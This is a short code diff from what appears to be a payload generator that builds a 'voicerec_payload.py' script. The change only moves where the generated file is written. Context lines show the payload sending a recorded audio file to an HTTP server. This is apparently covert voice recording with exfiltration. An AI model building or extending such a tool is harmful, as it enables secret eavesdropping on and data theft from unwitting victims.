@@ -112,7 +112,9 @@ if __name__ == "__main__":
             payload += f"""
     send_to_http(r"{http_server}", recorded_file)
 """
-        with open("voicerec_payload.py", "w") as f:
+        payload_path = os.path.join("Option", "modules", "payload", "payload_created", "voicerec_payload.py")
+        os.makedirs(os.path.dirname(os.path.abspath(payload_path)), exist_ok=True)
+        with open(payload_path, "w", encoding="utf-8") as f:
             f.write(payload)
 
     while True:
